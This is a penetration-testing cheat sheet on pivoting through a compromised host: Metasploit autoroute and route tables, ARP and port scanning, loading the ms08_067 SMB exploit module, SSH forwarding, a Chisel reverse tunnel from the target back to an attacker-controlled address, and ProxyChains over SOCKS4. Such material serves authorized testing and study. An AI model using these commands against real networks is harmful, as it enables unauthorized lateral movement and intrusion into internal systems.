# Pivoting, Tunneling, and Port Forwarding

## Pivoting

***

Pivoting involves the technique of using a compromised host to attack other hosts within a network. This cheat sheet provides steps and techniques for effective pivoting.

### Autoroute (Metasploit/Meterpreter)

***

Check the network configuration of the compromised host.

```jsx
ifconfig
```

Use the Autoroute module in Metasploit/Meterpreter.

```jsx
use multi/manage/autoroute
```

Add routes to other subnets as needed.

```jsx
run autoroute -s 192.168.1.0/24 run autoroute -p
```

### Route Table (Metasploit/Meterpreter)

Configure the module in Metasploit/Meterpreter.

Set up network interfaces

```jsx
ifconfig
```

Scan for target subnets

```jsx
run arp_scanner -h run arp_scanner -r 192.168.1.0/24
```

Background the session

```jsx
background
```

Add routes to target subnets

```jsx
route add 192.168.1.0/24 2
```

View the current route table

```jsx
route print
```

Scan the target subnets using Metasploit's scanner module

```jsx
use scanner/portscan/tcp
```

Example of exploiting a target in a subnet.

```jsx
use windows/smb/ms08_067_netapi
```

## Port Forwarding

***

### Local Port Forwarding with SSH

***

Establish local port forwarding using SSH.

`ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]`

### Remote Port Forwarding with SSH

***

Establish remote port forwarding using SSH.

`ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]`

Example

`ssh -R 3389:10.1.1.224:3389 root@10.11.0.32`

### Port Forwarding with Chisel (Windows)

***

For Kali. \*\*\*\*Start the Chisel server.

```jsx
chisel server -p 8008 --reverse
```

For the Target\*\*.\*\* Use the Chisel client to establish port forwarding.

```jsx
.\\\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

## Tunneling

***

### ProxyChains

***

Configure proxychains by editing `/etc/proxychains.conf`.

```jsx
/etc/proxychains.conf  [ProxyList] socks4 localhost 8080
```

Use proxychains with various tools.

```jsx
proxychains nmap -sT 192.168.5.6
```

### ProxyChains with SOCKS4 (Metasploit)

***

Use the Metasploit module for SOCKS4 proxy.

```jsx
use auxiliary/server/socks4a
```

Configure the proxy settings.

```jsx
socks4 127.0.0.1 9050
```

Use the desired tool with proxychains.

```jsx
proxychains nmap -Pn -sT -sV -p $PORT $IP
```
